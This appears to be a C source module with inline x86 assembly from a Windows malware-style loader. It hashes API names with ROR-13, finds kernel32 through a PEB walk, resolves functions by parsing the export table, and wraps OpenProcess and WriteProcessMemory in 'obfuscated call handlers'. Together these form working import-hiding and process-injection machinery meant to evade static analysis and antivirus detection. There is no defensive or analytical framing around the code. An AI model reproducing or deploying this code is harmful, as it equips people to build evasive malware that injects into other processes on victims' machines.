// Contains API address enumeration functions, hash table's of API name's whose addresses we need to resolve
// alongside obfuscated call handlers to call the resolved addresses(see sAPIName() handlers)
#include "api_handler.h"

// returns the hash of an API Name
DWORD HashApiName(char *szApiName)
{
	DWORD dwHash;
	
	__asm{
		mov esi, szApiName 
		xor eax, eax
		mov edi, eax
	GenerateHash:
		lodsb
		test al, al
		jz Hashed
		ror edi, 0xd
		add edi, eax
		jmp GenerateHash
	Hashed:
		mov dwHash, edi
    };
    
	return dwHash;
}

// returns base address of kernel32.dll
__forceinline LPVOID GetK32Base(void)
{
	LPVOID lpK32base;
	__asm
	{
		pushad
		sub eax,eax
		add eax,fs:[eax+30h]
		test eax,eax
		js os_9x
		
		mov eax,[eax+0ch]
		mov esi,[eax+1ch]
		lodsd
		mov eax,[eax+8]
		jmp finished
	os_9x:
		mov eax,[eax+34h]
		lea eax,[eax+7ch]
		mov eax,[eax+3ch]
	finished:
		mov [lpK32base],eax
		popad
    }
	
	return lpK32base;
}

// returns a specified API address via hash of name through parsing of the export table
FARPROC GetAPIAddress(const HMODULE hModule, const DWORD dwFuncHash)
{
	FARPROC	*pExportAddressTable;
	PWORD	pdwExportOrdinalTable;
	PIMAGE_NT_HEADERS pNtHeaders;
	PIMAGE_EXPORT_DIRECTORY pExportTable;
	char	**lpszExportNameTable, *pszName;
	int		i, nTotalNames;
	
	pNtHeaders = ImageNtHeader((LPVOID)hModule);
	if(pNtHeaders){
		if(pNtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386){
			pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			if(pExportTable){
				nTotalNames = pExportTable->NumberOfNames;
				pExportAddressTable	= (FARPROC *)((DWORD)hModule +  pExportTable->AddressOfFunctions);
				pdwExportOrdinalTable 	= (PWORD)((DWORD)hModule + pExportTable->AddressOfNameOrdinals);
				lpszExportNameTable 	= (char **)((DWORD)hModule + pExportTable->AddressOfNames);
				for(i = 0; i < nTotalNames; i++){
					pszName = (char *)((DWORD)hModule + lpszExportNameTable[i]);
					if(HashApiName(pszName) == dwFuncHash)
						return (FARPROC)((DWORD)hModule + (DWORD)pExportAddressTable[pdwExportOrdinalTable[i]]);
				}
			}
		}
	}
	
	return NULL;
}

// obfuscated call handlers

BOOL sWriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten )
{
	_asm
	{
		push lpNumberOfBytesWritten
		push nSize
		push lpBuffer
		push lpBaseAddress
		push hProcess
		call dword ptr [pWriteProcessMemory]
		mov dwReturnValue, eax
	}
	
	return (BOOL)dwReturnValue;
}

HANDLE sOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
{
	_asm
	{
		push dwProcessId
		push bInheritHandle
		push dwDesiredAccess
		call dword ptr [pOpenProcess]
		mov dwReturnValue, eax
	}
	
	return (HANDLE)dwReturnValue;
}
